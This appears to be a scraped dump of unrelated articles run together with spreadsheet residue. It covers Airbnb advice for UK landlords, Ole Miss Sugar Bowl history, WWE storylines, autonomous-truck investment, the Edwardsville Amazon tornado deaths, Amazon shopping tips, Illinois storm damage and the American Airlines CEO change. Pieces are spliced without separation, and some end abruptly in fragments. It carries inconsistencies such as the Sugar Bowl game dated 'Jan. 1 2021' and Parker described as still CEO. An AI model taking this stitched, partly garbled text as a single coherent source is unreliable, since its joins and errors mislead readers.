Higher return on investment - Traditionally the disadvantage of short-term lets is that they are more likely to have long vacant periods. However now people have the option to sign up for several months at a time landlords can secure long-term bookings and therefore more predictable income streams. The nature of Airbnb enables hosts to charge a higher rate than they would for regular tenants on Assured Shorthold Tenancies. For example in London Airbnb’s UK Insights report revealed that a typical host in London earned £74.28 a night and when this is compared to the average monthly rental income in London of £1430 reported by the Office for National Statistics in 2021 you get the following:

- Potential annual income from long term tenants: £17160

- Potential annual income from Airbnb (if booked 365 days a year): £27112.20

There are of course a lot of caveats to the above.

High occupancy rates on Airbnb depend on factors like property location and facilities and it is unlikely you’ll have it booked every single night - although this is where offering long-term lets can be particularly useful to guarantee occupancy. There are also local restrictions to be aware of such as the London 90-day rule (which limits the number of days you can host in the capital to 90 days per year) which will affect the amount of income you can earn. Still when considering the potential ratio for return on investment the above numbers show there can be significant benefits to using Airbnb.

Simplified tenancy process - There is a lot of regulation involved with being a landlord. Not only do you need to conduct multiple risk assessments and health and safety checks but there’s also a whole stack of rules around signing up new tenants including referencing and handling deposits.

While these regulations are rightly there to protect tenants from bad landlords they can add a lot of stress and delay to the tenancy process. On the other hand Airbnb hosts are constrained by much less regulation than regular landlords when it comes to tenancies. You will still need to comply with health and fire safety legislation and it makes good business sense to keep your property in a nice condition to attract more bookings. You’ll need to provide your tenants with a safe clean and comfortable experience - but any good landlord should be doing that anyway.

Peace of mind against damage - It’s a scenario landlords are all too familiar with; at the end of the tenancy your tenant leaves the property only for you to go round and discover that they’ve wrecked the carpets broken a door handle and lost the spare key. Then you are left to fight the tenant to claim the deposit which can take months in severe cases. Even if you are able to recover the funds from the deposit it's often not enough to cover the damage entirely.

The benefit of Airbnb is that when your guests leave the property is immediately checked over and contrary to popular belief wear and tear is greatly reduced with this type of letting. After all your guests are usually out for most of the day and when they are in they won't be having lots of different guests over or moving the furniture around!

While there will always be demand for long-term rentals in the UK using Airbnb for short and longer-term bookings can provide landlords with flexibility and freedom from increasingly prohibitive regulations. However renting properties out in this way can take up more of your time and energy particularly when it comes to queries and changeover.

If this is a concern it may be beneficial to engage the services of an Airbnb property management company who can manage the complete process for you from listing to cleaning as well as deal with any questions disputes or damages that may arise.

Diversifying into Airbnbs can be a lucrative move providing a higher return on investment with much less input than with traditional tenancies. Better still there are Airbnb management companies who can help take over the process leaving you free to step back and relax in the knowledge that everything is looked after.

Having a mixed portfolio of traditional rentals with Airbnbs can be a great way to balance risk against potential income gain giving landlords greater peace of mind and security.

Here are the other instances of the Rebels in the Sugar Bowl.

Ole Miss secured its first 10-win regular season in school history in 2021 and the Rebels were rewarded with a berth in the Allstate Sugar Bowl as a result.

The Rebels will take on Big 12 champion Baylor on the night of Jan. 1 in the Caesers Superdome in New Orleans and this is Ole Miss' 10th appearance in the Sugar Bowl in program history.

In the modern era the Sugar Bowl has a tie-in with the SEC and Big 12 champion if neither champion reaches the College Football Playoff. If the champion does reach the Playoff the berth falls to the next team in the conference pecking order. Since both of the SEC's top teams Alabama and Georgia reached the CFP this season that berth fell to Ole Miss for the 2021 season.

""Well it's huge. We knew that after winning the Egg Bowl that we were going to be in a major New Year's Six game. It was just a matter of which one. We were already recruiting that day and already doing that."" -- Lane Kiffin Sugar Bowl team selection press conference

The Sugar Bowl has been an annual event in college football since Jan. 1 1935 and is tied with the Orange Bowl and Sun Bowl as the second-oldest bowl games in the sport behind the Rose Bowl. Once Ole Miss plays this season's installment of the game on New Year's Day it will move into sole possession of fourth-place all-time in Sugar Bowl appearances behind Alabama (16) LSU (13) and Georgia (11).

Here are the results of Ole Miss' previous Sugar Bowl berths.

Jan. 1 1953 -- Georgia Tech 24 Ole Miss 7

Ole Miss' first appearance in the Sugar Bowl came after the 1952 season against Georgia Tech who at that time was still a member of the Southeastern Conference. Ole Miss' only score in the game came in the first quarter when it jumped out to a 7-0 lead but it was all Yellow Jackets from that point on.

With the win Georgia Tech was named National Champion by five of the nation's polls.

Jan. 1 1955 -- Navy 21 Ole Miss 0

The Rebels' second appearance in the Sugar Bowl under Johnny Vaught went similarly to their first as Ole Miss was shutout by Navy. This installment of the Sugar Bowl is the only appearance in the game in Navy's football history. This put a spoiler on a previously-undefeated season for Ole Miss but the Rebels finished the year ranked No. 6 in the country.

Jan. 1 1958 -- Ole Miss 39 Texas 7

Where Ole Miss had been outscored by a combined 45-7 in its first two appearances in the Sugar Bowl it made up a lot of ground when it faced Texas to conclude the 1957 season steamrolling the Longhorns 39-7. Ole Miss finished that season 9-1-1 with its lone tie coming against Mississippi State in the Egg Bowl.

Jan. 1 1960 -- Ole Miss 21 LSU 0

After its heartbreaking loss to the Tigers earlier in the 1959 season thanks to a Billy Cannon punt return Ole Miss bounced back against its rival in the Sugar Bowl. Syracuse was declared the National Champion by the Associated Press but Ole Miss was retroactively given the title as well by multiple polls giving it its first claim to a football national title in school history.

Jan. 2 1961 -- Ole Miss 14 Rice 6

In what was Rice's only appearance in the Sugar Bowl Ole Miss laid claim to another national championship following the 1960 season. Ole Miss finished the season 10-0-1 with its lone tie coming against LSU in Oxford. The Rebels were named National Champions by the Football Writers Association of America.

Jan. 1 1963 -- Ole Miss 17 Arkansas 13

During the 1962 season the Ole Miss campus was metaphorically ablaze with the enrollment of James Meredith in Oxford ending the university's history of racial segregation. With this scene grabbing national headlines the Ole Miss football team was as well going 10-0 with a win over Arkansas in the Sugar Bowl.

This season remains as Ole Miss' only undefeated and untied football season in school history. The Rebels were retroactively named National Champions by three polls.

Jan. 1 1964 -- Alabama 12 Ole Miss 7

Ole Miss suffered its first loss in the Sugar Bowl since 1955 when it fell to Alabama following the 1963 season. The Rebels finished this season 7-1-2 with the Sugar Bowl being its only loss of the campaign. The Ole Miss regular season was bookended by ties to Memphis State and Mississippi State.

Jan. 1 1970 -- Ole Miss 27 Arkansas 22

The Rebels concluded their 1969 season with a Sugar Bowl win over Arkansas for the second time in the last decade. This was the final Sugar Bowl appearance in the head coaching tenure of Johnny Vaught and the last Sugar Bowl appearance for Ole Miss until the 2015 season.

Jan. 1 2016 -- Ole Miss 48 Oklahoma State 20

In what will forever be remembered as the pinnacle of the Hugh Freeze era in Oxford Ole Miss dominated Oklahoma State in New Orleans to open the year 2016. The Rebels finished this season 10-3 its first 10-win season since 2003 and would not reach the postseason again until the 2020 season in year one under Lane Kiffin.

The 2017-2019 seasons were overshadowed by NCAA sanctions in Oxford left behind by Freeze's tenure. Although numerous games were vacated as a part of NCAA sanctions the 2015 season including the Sugar Bowl remained untouched in the record books.

Jan. 1 2021 -- Ole Miss vs. Baylor

As mentioned above this is Ole Miss' 10th appearance all-time in the Sugar Bowl. The Rebels and Bears have faced each other one time in the two schools' history a 20-10 win by Baylor in 1975. These two teams were originally scheduled to open the 2020 season at a neutral site but the COVID-19 pandemic sent the college football world into a landscape made up largely of conference-only schedules last year and that matchup fell victim as a result.

Ole Miss and Baylor will kick off at 7:45 p.m. CT on Jan. 1 and the game will be televised on ESPN.

Charlotte Flair Update,"Roman Reigns Back On WWE SmackDown Next Week Toni Storm vs. Charlotte Flair Update

WWE Universal Champion Roman Reigns will be returning to SmackDown on FOX next week.

Reigns has been announced for next Friday's SmackDown form the Allstate Arena near Chicago to continue the feud with Brock Lesnar for WWE Day 1. It was noted that Lesnar will also be there next Friday.

Reigns did not appear on this week's SmackDown as Paul Heyman noted that he was away on a one-week sabbatical to train for the WWE Day 1 bout with Lesnar. This week's SmackDown featured angles with Lesnar and Heyman designed to build to more tension between Reigns and Heyman next week.

SmackDown saw Sami Zayn in a wheelchair with two male nurses open the show and demand a rematch for Reigns due to Lesnar beating him up last week. Heyman interrupted Zayn but then Lesnar interrupted Heyman. Lesnar tried to make friends with Zayn and take him hunting until Heyman riled Lesnar up enough that he snapped and destroyed Zayn and his nurses.

Lesnar was later featured in a backstage segment where he referred to Heyman as still his advocate. He was featured in another segment where he intimidated Adam Pearce over the recent storyline fine and suspension that was handed down. This week's angles with Lesnar speaking were done really well and can be seen below.

WWE managed to get the ""#BrockLesnarsFlipPhone"" hashtag trending last night after Lesnar pulled out a flip phone during the segment with Pearce. Lesnar wanted to show Pearce a photo of a moose he had killed and gutted and ate while away on suspension but he couldn't figure out how to use the device. Lesnar became frustrated and broke the phone further intimidating Pearce.

In other news for next week's SmackDown the feud between Toni Storm and SmackDown Women's Champion Charlotte Flair is expected to continue. This week's show saw Storm defeat Flair in a non-title Championship Contender match but by DQ. Flair was disqualified after she failed to stop stomping Storm while she was down.

While it was not announced that Storm is the new #1 contender to Flair she should receive the title shot now or at least another chance at earning the title shot. It's possible they announce Storm vs. Flair for next week's SmackDown or likely at the WWE Day 1 pay-per-view on New Year's Day.

Stay tuned for more on next week's SmackDown. Below are a few shots of Lesnar and Storm vs. Flair from this week's show:

As dreams of having driverless cars whizz around cities in the next year or two fizzle focus is turning to autonomous trucks and work machines which have a much easier job of navigating restricted areas with no traffic or pedestrians such as mines and ports

We would all be whizzing round in robotaxis by now if Elon Musk had been right.

Instead fully self-driving vehicles are struggling to get away from the starting grid and some investors are betting that driverless trucks would reach the chequered flag first.

Only a year ago start-ups developing robotaxis were pulling in eight times more funding than firms working on autonomous trucks buses and logistics vehicles but the gap has narrowed dramatically this year.

With fewer regulatory and technological hurdles trucks operating on major highways fixed delivery routes or in environments far from cyclists and pedestrians such as mines and ports are now being seen as a faster way to generate returns.

In the year through Monday total investment activity for self-driving logistics vehicles leapt fivefold to US$6.5 billion from US$1.3 billion in the same period last year according to start-up data platform PitchBook.

Meanwhile investment activity for robotaxi firms fell 22 percent to US$8.4 billion from US$10.8 billion over the same period the PitchBook data compiled for Reuters shows.

The numbers might even understate the trend as some robotaxi firms such as Alphabet Inc’s Waymo are pumping more cash into their own autonomous trucking operations as well.

In the latest trucking deal Robotic Research said on Thursday that it has raised US$228 million by tapping outside investors for the first time to expand its autonomous trucks buses and logistics vehicles business.

The new money comes from investors including Softbank Group Corp’s Vision Fund 2 Enlightenment Capital and Luminar Technologies which makes lidar sensors used in self-driving vehicles.

Robotic Research chief executive alberto Lacaze told reporters that the company was deploying autonomous vehicles at scale where the business case works for customers “right now.”

“They don’t have to wait until 2025 unlike robotaxis where you need to have the cost of all the sensors come down by an order of magnitude” he said.

OVERPROMISES

As recently as 2019 Tesla Inc’s Musk had promised 1 million robotaxis “next year for sure” but self-driving vehicles that can navigate safely anywhere are still a long way off.

Peter Rawlinson head of electric vehicle (EV) start-up Lucid Motors Inc last month said it would be a decade before fleets of robotaxis hit the roads — even with the most advanced sensors.

PitchBook’s lead mobility analyst Asad Hussain said start-ups such as Gatik which makes autonomous short-haul vans and Nuro with its mini delivery robots could eclipse Waymo and rival Cruise over the next few years in commercializing at scale.

Still while long-haul trucks are easier to automate than robotaxis because major highways are simpler environments than bustling city roads self-driving truck company executives are cautious about how fast they can ramp up.

“We’re very cognizant of the overpromises that the industry has made” said Lu Cheng (呂程) chief executive of self-driving truck technology company TuSimple Holdings Inc which went public in the US in April with a market value of US$8.5 billion.

“The industry understands the complexity of the problem now and that solving it will take a longer time” he said.

For now TuSimple has a fleet of about 50 trucks with safety drivers aboard crisscrossing the US’ warmer southern states but it plans to have a national network covering major US highways by 2024.

That would involve major investments in mapping highways learning how to handle tougher weather and road conditions further north and in new self-driving trucks being developed by Navistar International Corp which is part of Volkswagen AG’s Traton.

‘A LONG JOURNEY’

However rolling out a truly national network could take years as self-driving trucks still face a major challenge: human drivers.

An autonomous vehicle would always hit the brakes if it encounters a “testosterone-laden human male” said Ralf Klaedtke chief technology officer at TE Connectivity which makes sensors and electronic systems to handle masses of self-driving data for the auto industry.

“The autonomous vehicle will always be the slowest in mixed traffic” he said.

Paul Newman founder of British autonomous vehicle software start-up Oxbotica said robotaxis remained his “North Star” his clear long-term goal.

However for now he is focusing on simpler applications some of which use a purpose-built fully electric self-driving vehicle from Australian start-up Applied EV.

“This is a long journey” he said while showing off test vehicles at the company’s headquarters in Oxford England. “It’s one of the hardest engineering problems to solve.”

Oxbotica is working on vehicles for mines in partnership with Wenco part of Hitachi Construction Machinery Co and on many different options with energy company BP PLC such as vehicles for remote wind and solar farms.

Morag Watson BP’s senior vice president for digital science and engineering said Oxbotica’s technology could monitor large sites or haul equipment out to humans undertaking repairs.

She said they would be testing many different options next year.

“We’ve barely scratched the surface of what we can do with industrial autonomy” Watson said.

Oxbotica is also working with British online food delivery and technology company Ocado Group PLC which automates supply chain systems for the likes of US retail chain Kroger Co. BP and Ocado have both invested in Oxbotica.

Alex Harvey Ocado’s head of advanced technology said Oxbotica’s technology could be used “in the warehouse in the yard on the road or kerb to kitchen.”

NO LEFT TURNS

US autonomous EV maker Outrider has targeted distribution yards — picking up trailers after truckers drop them off and lining up new ones to be hauled away — including at a Chicago yard for paper company Georgia-Pacific LLC.

Outrider has developed a robot arm for the truck to connect and disconnect trailers. It has raised US$118 million so far and chief executive Andrew Smith says it would scale up to thousands of vehicles over the next five years.

The start-up wants to start doing short hops between yards but operating on public roads adds complexity Smith said.

“We saw through the early hype of the technology and recognized distribution yards were the perfect near-term solution with their repetitive low-speed operations in confined environments” he said.

Going out on public roads requires moving carefully partly because of regulations but also because of legal pitfalls in a litigious market such as the US.

Ian White chief executive of digital insurer Koffie Labs Inc said a “black-swan billion-dollar” crash could wipe out any company that moves too fast and gets it wrong.

“You’d be putting your balance sheet on the line” he said.

That is why Gatik has opted for a careful approach for its “middle-mile” delivery routes between distribution centers and retailers chief executive Gautam Narang said.

Gatik’s trucks run on short predictable routes avoiding left turns across oncoming traffic schools hospitals fire stations blind turns — or anything complicated.

“We’re not working on every tricky situation the autonomous vehicle industry is trying to solve” he said. “We’re taking baby steps using routes that are uneventful from a complexity standpoint.”

Gatik works with Walmart Inc and Loblaw Companies Ltd using autonomous trucks with safety drivers although it operates some driverless routes in Arkansas and sees the global shortage of drivers as an opportunity.

“We decided to focus on a simpler use case where the need was very acute” Narang said. “We’re not building the technology for technology’s sake.”",,,,,,,,,

At least six people died at an Amazon (AMZN) warehouse building collapse after an EF-3 tornado caused major structural damage to the building Friday according to the Edwardsville Fire Department in Illinois.

Forty-five people made it out of the building with one person airlifted to a regional hospital for treatment Edwardsville Fire Chief James Whiteford said during a Saturday evening news conference.

Amazon workers identified as dead by the local coroner were Deandre S. Morrow 28 of St. Louis Missouri; Kevin D. Dickey 62 of Carlyle Illinois; Clayton Lynn Cope 29 of Alton Illinois; Etheria S. Hebb 24 of St. Louis Missouri; and Larry E. Virden 46 of Collinsville Illinois. Amazon cargo driver Austin J. McEwen 26 died trying to shelter from a powerful tornado in the bathroom at the warehouse according to a coworker.

“He was my friend and he didn’t make it” said coworker Brian Erdmann who was on his way to make a delivery to the warehouse. “If I would have got back 45 minutes earlier I probably would have been at the same place. I would have been right there with him.”

The recovery phase is expected to take three more days and first responders will continue “to search the site for evidence of life” Whiteford said.

“Earlier this afternoon the response portion of this incident came to a close and we’re now focused solely on recovery” Whiteford said.

Amazon Worldwide Consumer CEO Dave Clark said the company’s staff was saddened at the loss of life at the facility and beyond.

“Our thoughts and prayers are with the victims their loved ones and everyone who has been impacted by the storm’s path across the U.S. We’re continuing to provide support to our employees and partners in the area and across the communities affected by the storms. We also want to thank all of the first responders for their ongoing efforts on the scene” Clark said in a tweet.

Several employees told Reuters that they had been directed to shelter in bathrooms by Amazon managers after receiving emergency alerts on mobile phones from local authorities. The first warning was issued about 40 minutes before the tornado hit according to firefighters and the Illinois governor.

Amazon confirmed in an email that the site got tornado warnings through various alerts. “Our team worked quickly to ensure as many employees and partners could get to the designated Shelter in Place” the company said in a statement. “We thank them for everything they were able to do.”

Workers gave conflicting accounts as to whether the bathroom was the designated shelter. Amazon did not comment.

Some of those workers said they had kept their phones in violation of an Amazon policy that prevents them from having cellphones at work.

The company responded by saying employees and drivers are allowed to have their cellphones.

“I was at the end of my route. I was just getting in the building and they started screaming ‘Shelter in place!’” said David Kosiak 26 who has worked at the facility for three months. “We were in the bathrooms. That’s where they sent us.”

“It sounded like a train came through the building. The ceiling tiles came flying down. It very loud. They made us shelter in place til we left - it was at least two and a half hours in there.”

Retail Wholesale and Department Store Union criticized Amazon for requiring employees to work through a tornado warning.

“This is another outrageous example of the company putting profits over the health and safety of their workers and we cannot stand for this. Amazon cannot continue to be let off the hook for putting hard working people’s lives at risk. Our union will not back down until Amazon is held accountable for these and so many more dangerous labor practices” said Stuart Appelbaum President of the RWDSU.

The chief said approximately 150 yards of the building collapsed after the tornado touched down at 8:35 p.m. CT on Friday.

Edwardsville is approximately 25 miles northeast of St. Louis Missouri.

Amazon workers are pushing back against a phone ban after six employees died when a warehouse collapsed in Illinois.

The long-running policy had been relaxed during the pandemic but is being reinstated around the country.

""After these deaths there is no way in hell I am relying on Amazon to keep me safe"" a staffer told Bloomberg.

Amazon employees are speaking out about the return of a controversial mobile phone ban after devastating tornadoes ripped through the Midwest on Friday destroying an Illinois warehouse and killing at least six employees.

Though the e-commerce giant had previously relaxed its strict rules prohibiting phones on the warehouse floor during the pandemic it has been slowly reintroducing the ban across the country Bloomberg reported. Amazon initially revoked the protocol to allow for staffers to get in touch with loved ones or health care providers in case of emergency.

However as the ban returns to Amazon locations several employees told Bloomberg they are once again questioning the policy and expressing fear for their safety after the collapse of an Edwardsville Illinois warehouse left at least six workers dead and an unknown number missing on Friday.

Edwardsville officials reported that a wall the size of a football field and the roof above it collapsed at the warehouse when severe storms hit the region leaving an unidentified number of Amazon employees trapped among the rubble.

Rescue crews arrived on the scene immediately where one worker was airlifted to a nearby hospital and 45 staffers were evacuated from the ruins according to Edwardsville fire chief James Whiteford. Whiteford said he expects the recovery effort to continue for an additional three days.

In Kentucky which bore the brunt of the tornadoes Kentucky Gov. Andy Beshear said on Sunday he feared at least 80 people were killed but the death toll may surpass 100. In addition to Illinois and Kentucky the storms also tore through parts of Arkansas Tennessee and Missouri.

Amazon staffers speaking to Bloomberg expressed concern that banning phones would leave them incapable of quickly calling for help or accessing information about imminent storms or other dangerous conditions that might put them in peril.

""After these deaths there is no way in hell I am relying on Amazon to keep me safe"" an Amazon worker from a nearby facility in Illinois told Bloomberg. ""If they institute the no cell phone policy I am resigning.""

""After this everyone is definitely afraid of not being able to keep their phones on them"" another worker told Bloomberg. ""Most employees that I've talked to don't keep their phones on them for personal conversation throughout the day It's genuinely for situations like this.""

Warehouse Workers for Justice an organization that works to organize Amazon workers in Illinois said in a statement that it is calling on state legislators to hold a hearing to ensure all facilities ""are places of safety for workers and that no family has to worry whether or not their loved ones will make it home from work after an extreme weather event.""

""While natural disasters are not controllable Amazon's preparedness and safety protocols are"" Warehouse Workers for Justice said in the statement.

Amazon did not immediately respond to Insider's request to comment on the phone ban and if it has plans to readjust the policy. In a statement yesterday a representative for Amazon said the company was ""deeply saddened by the news"" of the Illinois warehouse.







""Our thoughts and prayers are with the victims their loved ones and everyone impacted by the storm"" the Amazon representative said. ""We also want to thank all the first responders for their ongoing efforts on scene.""

Amazon founder Jeff Bezos wrote on Twitter on Saturday night that he was ""heartbroken over the loss"" a statement that came following criticism that the executive had been late to comment on the tragedy. Earlier in the day Bezos shared a photo to Instagram with the Blue Origin space crew the next team to board the New Shepard rocket.

""All of Edwardsville should know that the Amazon team is committed to supporting them and will be by their side through this crisis"" Bezos wrote on Twitter. ""We extend our fullest gratitude to all the incredible first responders who have worked so tirelessly at the site.""",https://news.google.com/articles/CBMihQFodHRwczovL3d3dy51c2F0b2RheS5jb20vc3RvcnkvdGVjaC9jb2x1bW5pc3Qva29tYW5kby8yMDIxLzEyLzEyL2hvdy1nZXQtbW9zdC1vdXQteW91ci1hbWF6b24tYWNjb3VudC1hbmQtc2F2ZS1zb21lLW1vbmV5LzY0NTMwMjIwMDEv0gEA?hl=en-US&gl=US&ceid=US%3Aen,How to take full advantage of your Amazon account and save money,"Kim Komando

Special to USA TODAY

Even if you’re not an Amazon fan you can’t deny how easy it is to find just about anything you want. That includes of course holiday gifts.

This year be an Amazon shopping ninja. Tap or click here for clever ways to hide your gift orders get Amazon Prime for less money trade in your older gadgets for credit and more.

There’s also account security to consider. You should remove your Amazon public profile for one. Tap or click for five security steps every Amazon shopper should take.

Then we get to the money. Whether you're buying presents getting yourself a few gifts or doing your regular shopping there are tricks you can use to save a pretty penny.

1. Sign up for an Amazon Business account

If you shop on Amazon a lot you likely have a Prime account. Here are some of my favorite perks included with the subscription.

An Amazon Business account gives you perks that you don’t get with a Prime account. You get exclusive discounts and can sell products and services to other businesses. You still get free shipping and access to Prime Day deals Lightning Deals and Prime Early Access too.

Tap or click here to start your free Amazon Business account.

Life tip you won’t find on TikTok: 9 photos you should always have on your phone at your fingertips

2. Don’t forget about Lightning Deals

Unlike Prime Days Lightning Deals happen all the time. Lightning Deals generally include products with limited stock or a set time limit. For example a smart speaker could be on sale for 75% for the next three hours or until it sells out. If you see a deal you like grab it before it’s gone.

Lightning Deals can be found throughout Amazon and are available on the Today’s Deals page. You can also browse upcoming deals and add yourself to the waitlist so you get an alert when the deal is active. Don't wait though. You'll only have a limited amount of time to make a purchase.

Here’s the bad news: Amazon shares your private info – unless you do something about it.

3. Don’t forget to cut coupons

No scissors are necessary for these coupons. When you're shopping look for a checkbox near the item's price. If you click a virtual coupon will be applied. If you don't click you don't get the discount. Check to make sure you've saved all you can before submitting your order.

4. Be patient

Do you need every item rushed to your door? Gifts you might need as soon as possible but when you can wait you’ll get a little something in return.

Select a later shipping date to get credit toward future orders or media at checkout. When you select a delivery date you'll see any available incentives for no-rush delivery. These are often just small credits toward media like audiobooks but it all adds up.

Struggling with what to buy all your favorite people this holiday season? My team and I put together gift guides for everyone on your list.

5. Check out the Amazon credit card

This is not financial advice and you shouldn’t spend money you don’t have. That said the Amazon Prime Rewards credit card has some pretty darn good benefits when you use it to shop on Amazon.com.

• You get 5% cash back on purchases from Amazon and Whole Foods Market

• Earn 2% back at restaurants gas stations and drugstores

• Get 1% back from utilities ride-share and all other purchases

• You can even get 10% or more back on select Prime products

You also get an Amazon Gift Card upon approval.

As for interest you can choose a percentage back or 0% APR for 6-18 months on $50 or more purchases. After the 0% promo period ends a variable APR of 14.24% to 22.24% applies.

Tap here to fill out an application for an Amazon Rewards card and see if you qualify.

6. Another way to score discounted products

Amazon Warehouse features items that were returned or slightly used. This includes refurbished or open-box items. It’s a great source for video games appliances power tools cameras school supplies and electronics in general. You can use your Prime benefits for free shipping and there’s a good return policy.

Tap or click here to check out some wares from Amazon Warehouse. Be sure to check out the item’s condition so you know what you’re getting.

On the other hand Amazon Outlet includes closeout clearance and overstock items. For example you may find holiday items that are out of season for ridiculously cheap.

Powerful storms that slammed Illinois and five other states Friday night downed power lines trees and left other debris scattered across Springfield and central Illinois.

At least one tornado has been confirmed in Cass County by the National Weather Service in Lincoln.

Rain began pelting the area just before 8 p.m. with winds reaching 58 mph at Abraham Lincoln Capital Airport in Springfield said meteorologist Alex Erwin of the National Weather Service in Lincoln.

Sangamon County Sheriff Jack Campbell reported deputies responded to multiple calls of fallen power lines and trees but no other major damage as of 9:30 p.m.

As of 8 a.m. Saturday 823 City Water Light and Power customers remained without power. Around the area Ameren Illinois had 1114 customers without service.

The tornado report was three miles northwest of Philadelphia in Cass County at about 7:55 p.m. Erwin said.

Philadelphia is about 27 miles northwest of Springfield.

The NWS gave a rating of EF2 to the tornado based on the damage it caused.

One home sustained damage while there was structural damage to additional buildings around that house he said.

""We expect to find (more damage when crews are) out there today"" Erwin said.

Straight line winds from the same storm complex also toppled power lines in Chatham and Buffalo Erwin said.

A house sustained damage on Altig Bridge Road around Petersburg said Menard County Sheriff Deputy Chief Ben Hollis. A gas leak forced the family to evacuate the home Hollis said.

The storm blew apart an unattached garage at the property Hollis said. The trusses from the garage impaled the roof of the house he added.

There was structural damage to a cattle barn across the road Hollis said.

Two machine sheds east of Atterberry one on Masters Road and one on Pin Hook Road were completely leveled Hollis added.

A number of customers in the northern part of Menard County served by Menard Electric Cooperative were still without power at noon Saturday.

Altig Bridge Road from Fairgrounds Road to Carter was closed as was Masters Road from Fairgrounds Road to Lincoln Trail Road.

A Facebook post referred to the area as ""a large debris field.""

There were no immediate reports of injuries.

Springfield Fire Chief Brandon Blough said 15 members of the Springfield Fire Department tactical unit were deployed to help with rescue efforts at the Edwardsville Amazon facility hit by the storm. The unit was later demobilized and headed back to Springfield.

The New Berlin-Athens high school boys basketball game was postponed in the third quarter Friday because of a power outage at the Athens High School gymnasium. The game will be picked up at 6 p.m. Thursday.

There was also a stoppage during the Williamsville-Pleasant Plains game Friday at Pleasant Plains. That game was finished.

Erwin said it is not uncommon to get severe weather in the fall months with the area seeing a secondary peak in severe weather reports in October and November.

""December can get a little late but it can happen"" Erwin said.

A late-season tornado outbreak hit the state on Dec. 1 2018 with more than two dozen confirmed tornadoes. More than 500 homes were damaged in the Taylorville area where top wind speeds reached 120 mph.

Erwin said Friday's storms were the result of a strong low-pressure system that tracked northwest of central Illinois. It brought Gulf moisture up into the area and provided support for strong thunderstorms he said.

The only remaining concern for Saturday Erwin added were gusts of wind hovering around 50 mph. The winds were expected to diminish into the afternoon.

Erwin said no impactful weather was on the horizon for next week and that near record high temperatures were expected for Wednesday.

American Airlines announced last week that Robert Isom would replace Doug Parker as CEO of the carrier. Here’s to hoping for improvement – but what other choice do we have?

Out With The Old In With The New

Doug Parker lasted longer than I ever thought he would and I can comfortably say that while I was wrong about his departure date I wasn’t wrong that he needed to go. At long last American Airlines chairman and chief executive officer Doug Parker will step down in March 2022.

Parker ran America West when the company swallowed up financially challenged US Airways which then repeated the action again with a “merger” of US Airways and American Airlines. CEO Doug Parker brought Scott Kirby (now CEO of United Airlines) along with him and Robert Isom (among others) the future CEO at American.

Kirby left for rival United a few years ago and has busied himself with large sea changes and bold proclamations. Robert Isom has worked within the airline industry for more than 20 years and as President of the airline currently he oversees many aspects of the business. While Parker will retire as the airline CEO President Robert Isom will assume only that role and not Chairman.

From his American Airlines bio:

“Robert Isom is president of American Airlines Group and American Airlines its principal subsidiary company. In this role he oversees American’s operations planning marketing sales alliances and pricing. Robert previously served as executive vice president and chief operating officer at American after holding those same positions at US Airways. Prior to joining US Airways he served as chief restructuring officer for GMAC LLC. and as senior vice president – Ground Operations and Airport Customer Service vice president – International and vice president – Finance for Northwest Airlines. Between 1995 and 2000 Robert was with America West Airlines and held executive roles in Revenue Management Operations and Finance. He started his career at The Procter & Gamble Company. Robert earned a Bachelor of Science degree in mechanical engineering and a Bachelor of Arts degree in English from the University of Notre Dame as well as a Master of Business Administration degree from the University of Michigan.”

Isom replaces an accomplished Parker -whether you like him or not he pulled off some pretty big coups – but will it still be the carrier that Parker and Kirby had shaped or will it change?

Real Change Or More Of The Same?

Labor

Parker started out a little bit sloppy with an ill-advised meeting with union reps. Unions would haunt Parker as management and labor failed to reach agreements numerous times (several labor groups) during his tenure. Isom had his own incursion with labor and will have to navigate already tense relations with a substantially challenging business environment.

Product

Parker along with Kirby steered the company away from the brand that was being built and turned it into a global discount carrier model. The most impressive fleet in the US when Parker took over the airline has installed such dense seating that 737-MAX lavatories are unusable (though Parker hasn’t tried them out) and removed the newly installed IFE on some aircraft. Will the product get better?

Planning and Routes

The airline announced this week that it would have to abandon several international routes next year that the carrier had only recently added due to lack of equipment. But the carrier is still paying for leased A330s they aren’t flying and retired but recently renovated 767s (parked in the desert) capable of filling the demand until Boeing can deliver its product. Will Isom find ways to deliver a competitive product to customers?

The Only Way Is Up

American has increased its debt decreased its share of the market (it was once the world’s largest airline) and now can’t even fly the few European routes it has added. Parker destroyed relationships with labor Kirby killed the premium aspect of the product and the loyalty program but the good news is there’s little left for Isom to destroy. That last statement is somewhat tongue-in-cheek but also somewhat genuine. The carrier has fallen behind United for premium ground services Delta for hard product and elite management and the company is reinventing loyalty in a way that will further reduce the number of status holders.

The good news is that there are some quick wins if Isom can carve a name for himself in Fort Worth. A partnership with JetBlue and new oneworld member Alaska Airlines can help the airline recover quicker than the competition. When the airline begins receiving its A321-LR equipment capable of replacing some 757 European routes the airline may be able to leap past these current route cancellations.

However Isom will still face a challenge to any serious shift from the way the airline has been run as long as Parker remains chairman and CEO Isom will have to choose his battles.

Conclusion

Beginning in March of 2022 there will be a new American Airlines CEO at the helm. While the carrier is fertile ground for rejuvenation and ready for a good comeback story delivery of such remains to be seen. Parker’s lingering presence won’t likely help Isom make the changes he needs to enact.

What do you think? Is American going to see more of the same or a new focus?",https://news.google.com/articles/CBMiemh0dHBzOi8vd3d3Lndzb2N0di5jb20vbmV3cy9sb2NhbC9hbWVyaWNhbi1haXJsaW5lcy1zY3JhcC1mbGlnaHQtY2x0LWhvbm9sdWx1LXNjaGVkdWxpbmctc2hpZnQvU05QRkFBSU03Vkg1Uk9CNDNFSElYV0dHQTQv0gGJAWh0dHBzOi8vd3d3Lndzb2N0di5jb20vbmV3cy9sb2NhbC9hbWVyaWNhbi1haXJsaW5lcy1zY3JhcC1mbGlnaHQtY2x0LWhvbm9sdWx1LXNjaGVkdWxpbmctc2hpZnQvU05QRkFBSU03Vkg1Uk9CNDNFSElYV0dHQTQvP291dHB1dFR5cGU9YW1w?hl=en-US&gl=US&ceid=US%3Aen,American Airlines to scrap flight from CLT to Honolulu in scheduling shift,"We’re Sorry!

“Connectivity that is an important word from the day of the Wright brothers wanting to fly…today we have ascended to a different level where we have commercial flights from mainland USA. Thank you for seeing Anguilla as a destination that needs your help and we look forward to making it profitable for you” Webster stated.

During a discussion of carbon capture technologies — ways to capture transport and bury atmospheric carbon dioxide deep underground — Manchin cited several statistics about the trend lines during the past decade for coal-fired power plants.

Manchin said that China India and other major nations have increased the number of coal-fired power plants while the U.S. has decreased its number.

""The United States had 589 (coal-fired plants) 10 years ago"" Manchin said during the Nov. 16 hearing. ""We're down to 504. … We are the only nation that has reduced our reliance as far as in coal energy.""

We decided to check Manchin’s math.

